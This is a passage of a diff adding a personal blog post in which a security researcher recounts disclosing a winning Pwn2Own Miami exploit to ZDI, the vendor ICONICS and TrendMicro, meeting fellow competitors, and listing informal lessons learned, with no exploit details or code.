+<p>I followed one of the event organizer to the disclosure room which is where ZDI verifies that the exploit used to compromise the target isn't something that they know about. I shared the details about the vulnerability. The person looked around on their laptop for a minute or two and said that they didn't know about this issue. Awesome. The second stage of the disclosure happens with the vendor. An employee of ICONICS entered the room, I described to them the vulnerability and the exploit at a high-level. They looked a bit overwhelmed with my description so I started to slow down and repeat the most important bits. They also said they didn't know about this bug so I had officially won. I also spend sometime with an employee from TrendMicro whose job was to build a potential network signature for the exploit. I shared the relevant details about my exploit and how I would go about detecting this from the network.</p>
+<p>I handshaked the organizers and I went back to my hotel with a big ass smile on my face. I dropped my laptop there, and figured I would take the day after off as a little reward for myself. I went back to the venue and hanged out in the room to attend the other entries for the day. This is where I eventually ran into <a href="">Steven Seeley</a> and <a href="https://twitter.com/mufinnnnnnn">Chris Anastasio</a>. Those guys were planned to demonstrate<br>
+5 different exploits which seemed insane to me 😳 They were extremely nice and let me know that they were setting up a dinner with other participants. I was definitely game to join them and meet up with folks. </p>
+<p>We met at a restaurant in Miami Beach and I met the Flashback team (Peiro &amp; Radek), Claroty Research team (Sharon &amp; Uri) and the folks from Computest Sector7 (Daan &amp; Thijs). Honestly, it felt amazing to meet felow researchers and learn from them. It was super interesting to hear people's backgrounds, the way they approached the competition and how they looked for bug.</p>
+<p>I spent the next two days hanging out; cheering for the competitors in the Pwn2Own room, grabbing celebratory drinks, having a good time. Steven &amp; Chris owned so many targets with a first-blood that they also won many laptops and out of kindness offered me one as a present which I was super grateful for and would be a great memento memory for me.</p>
+<p>I drove back to the airport and flew back home with life long memories 🙏🏽</p>
+<h1 id="wrapping-up">Wrapping up</h1>
+<ul>
+<li>feeling mountains after mountains after mountains</li>
+<li>kepaboo, rop-bf, paracosme, oua,</li>
+<li>i wanted to find memory corruptions; but def less practical for such a contest; if you want to hit several targets as well; think about it, i didnt really think about any other way</li>
+<li>configuration of the target, os, vector, etc super important; ping zdi if youre not sure</li>
+<li>identify your goals; more targets, maybe different bugs, more shallow, breadth vs depth</li>
+<li>attack surface enumeration is important; i dont do enough of it</li>
+<li>still in shock that the exploit landed</li>
+<li>testing, testing, testing; nearly missed that my exploit wouldn't run on a certain sku of windows</li>
+</ul>
+<p>Here are useful links</p>
+                </div><!-- /.entry-content -->
+        </article>
+</section>
+        </div><!--/span-->
+      </div><!--/row-->
+      <hr>
+
+      <footer style='background-color:#00000000'>
+        <center>
+          <address id="about">
+                  Proudly powered by <a href="http://pelican.notmyidea.org/">Pelican <i class="icon-external-link"></i></a>,
+                                  which takes great advantage of <a href="http://python.org">Python <i class="icon-external-link"></i></a>.
+          </address><!-- /#about -->
+
+          <p>The theme is from <a href="http://twitter.github.com/bootstrap/">Bootstrap from Twitter <i class="icon-external-link"></i></a>,
+                     and <a href="http://fortawesome.github.com/Font-Awesome/">Font-Awesome <i class="icon-external-link"></i></a>, thanks!</p>
+        </center>
+      </footer>
+
+    </div><!--/.fluid-container-->
+
+
+    <script src="../../../../../theme/js/jquery-1.7.2.min.js"></script>
+    <script src="../../../../../theme/js/bootstrap.min.js"></script>
+  </body>
+</html>
